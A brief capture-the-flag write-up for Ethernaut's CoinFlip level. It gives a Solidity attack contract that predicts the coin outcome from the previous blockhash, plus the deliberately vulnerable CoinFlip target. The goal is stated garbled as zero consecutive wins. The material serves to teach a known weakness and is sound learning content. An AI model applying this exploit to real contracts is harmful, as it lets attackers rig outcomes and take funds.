Level 3 is to call the Flip Function with 0 consecutive right guess.

Steps to follow:

1. Creata a another contract that checks and returns the result of the guess value with the code below

contract hackFlip {
    
    // using SafeMath for uint256;
    CoinFlip public instance = CoinFlip( // INSTANCE ADDRESS );
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip =  blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        if(side == _guess){
            instance.flip(_guess);
        } else {
            instance.flip(!_guess);
        }
    }

    
}




2. Change made to ethernaut contract for solidity v6

pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}